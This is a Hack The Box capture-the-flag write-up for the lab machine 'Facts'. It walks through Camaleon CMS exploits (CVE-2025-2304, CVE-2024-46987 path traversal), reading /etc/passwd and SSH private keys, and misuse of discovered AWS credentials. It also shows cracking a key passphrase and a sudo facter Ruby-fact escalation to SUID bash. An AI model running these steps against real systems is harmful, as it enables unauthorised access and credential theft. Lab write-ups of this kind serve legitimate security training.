# Facts – By xcotelo

* **Difficulty:** Easy
* **IP:** `10.10.11.xx`
* **Completion date:** 07/02/2026
* **Platform:** Hack The Box

---

## 🔎 Enumeration

### Nmap — initial scan

Command used:

```bash
sudo nmap -vvv -Pn -n -sV --min-rate 5000 10.129.8.248
```

**Key findings:**

* `22/tcp` → OpenSSH 9.9p1 Ubuntu
* `80/tcp` → nginx 1.26.3
* Hostname: `facts.htb`

Relevant output (summary):

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu
80/tcp open  http    nginx 1.26.3
_http-title: facts
```

<img width="1139" height="684" alt="nmap" src="https://github.com/user-attachments/assets/21725fbe-dd94-4fc2-9184-32dd7d870a96" />

---

## 🧭 Web Enumeration

Directory and content discovery revealed a CMS-backed website. Running `gobuster` uncovered the `/admin/` panel:

```bash
gobuster dir -u http://facts.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```

The admin panel redirected to `/admin/login`, confirming the presence of **Camaleon CMS**.

<img width="930" height="227" alt="2026-02-05_19-51" src="https://github.com/user-attachments/assets/3ecbc03a-2d2f-43ef-b17f-6597cba550e4" />

---

## 🧩 Camaleon CMS — CVE-2025-2304

A user account can be registered. Once logged into the dashboard, the CMS version is disclosed. 

Knowing that, we can found the CVE-2025-2304 which it is possible to escalate privileges and gain **administrator access** to the CMS (we will use it later).

<img width="640" height="539" alt="primeirocve" src="https://github.com/user-attachments/assets/91a36a38-b4d9-41b0-825a-1266673acd58" />

---

## 📂 Arbitrary File Read — CVE-2024-46987

Camaleon CMS is vulnerable to **CVE-2024-46987**, a path traversal issue in the `MediaController` that allows authenticated users to read arbitrary files on the server.

A public PoC can be used to exploit this flaw:

```bash
python CVE-2024-46987.py -u http://facts.htb --user 123 -p 123 /etc/passwd
```

After this, we can see that there are two users: William and Trivia

This grants access to `user.txt` and also allows reading SSH private keys from other users.

<img width="823" height="683" alt="usuarios_co_exploit" src="https://github.com/user-attachments/assets/861450ed-211a-4f54-9e42-38eb9689b81a" />

Example — reading Trivia's SSH key:

```bash
python CVE-2024-46987.py -u http://facts.htb --user hyh -p hyh /home/trivia/.ssh/id_ed25519
```

---

## ☁️ AWS Credentials Discovery

Further inspection of the CMS configuration revealed **AWS credentials**. After configuring the AWS CLI:

```bash
aws configure
```

The instance exposes an S3-compatible service:

```bash
aws s3 ls --endpoint-url http://facts.htb:54321
```

Two buckets were found: `internal` and `randomfacts`. The `internal` bucket mirrors Trivia’s home directory, including `.ssh/id_ed25519`.

---

## 🔐 SSH Access — Cracking the Key Passphrase

The retrieved SSH private key is passphrase-protected. Using `ssh2john` and `john`, the passphrase can be cracked:

```bash
ssh2john id_ed25519 > ssh.hash
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="930" height="227" alt="2026-02-05_19-51" src="https://github.com/user-attachments/assets/b5b13bb1-615c-4aeb-bdcd-89ee267b5705" />

Recovered passphrase:

```
dragonballz
```

This allows SSH access as user `trivia` and retrieval of `user.txt`.

---

## 🧑‍💻 Local Enumeration

Checking sudo privileges:

```bash
sudo -l
```

Result:

```
(ALL) NOPASSWD: /usr/bin/facter
```

The `facter` binary is a Ruby script executed with root privileges.

<img width="947" height="179" alt="sudol" src="https://github.com/user-attachments/assets/69d92fc0-e413-4a56-bd0d-fb3d7b143e15" />

---

## 🚀 Privilege Escalation — GTFOBins (facter)

According to **GTFOBins**, `facter` can be abused to load custom Ruby facts from an arbitrary directory.

<img width="953" height="352" alt="gtfobins org gtfobins facter" src="https://github.com/user-attachments/assets/9460f5a8-4cc3-4674-aedd-9bd2c1b72a0d" />

We create a malicious Ruby file that executes a command as root:

```bash
mkdir -p /tmp/proba
cd /tmp/proba
cat > proba.rb << 'EOF'
#!/usr/bin/env ruby
system("chmod +s /bin/bash")
EOF
```

<img width="519" height="119" alt="ruby" src="https://github.com/user-attachments/assets/16539da0-be4f-4ee5-81d0-07bbab7cc7c7" />

Execute `facter` with the custom directory:

```bash
sudo /usr/bin/facter --custom-dir=/tmp/proba/ x
```

This sets the SUID bit on `/bin/bash`.

<img width="639" height="96" alt="bit_setuid" src="https://github.com/user-attachments/assets/365e4ab3-6703-4a4c-a62e-93e1a86e4530" />

---

## 👑 Root Access

With SUID bash in place:

```bash
/bin/bash -p
id
```

Result:

```
uid=0(root) gid=0(root)
```

Root flag can now be read:

```bash
cat /root/root.txt
```

<img width="511" height="114" alt="2026-02-09_14-11" src="https://github.com/user-attachments/assets/9289be70-d47a-4ab6-8364-483984828323" />

---

## ✅ Result

<img width="650" height="532" alt="2026-02-09_14-12" src="https://github.com/user-attachments/assets/53002266-ce64-437f-9816-6f8e0a8bbff4" />
